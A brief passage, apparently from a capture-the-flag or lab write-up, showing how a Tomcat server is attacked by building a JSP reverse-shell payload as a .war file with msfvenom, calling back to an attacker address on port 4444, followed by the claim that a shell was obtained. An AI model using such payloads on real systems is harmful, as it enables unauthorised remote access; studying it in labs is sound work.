Tomcat is a Java web application server, so let's try uploading a `.war` web shell.


```shell
kali@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.91 LPORT=4444 -f war > shell.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes

kali@kali:~$ ll | grep .war
-rw-rw-r--  1 kali kali  1100 Mar  9 18:04 shell.war
```


And we got our shell!
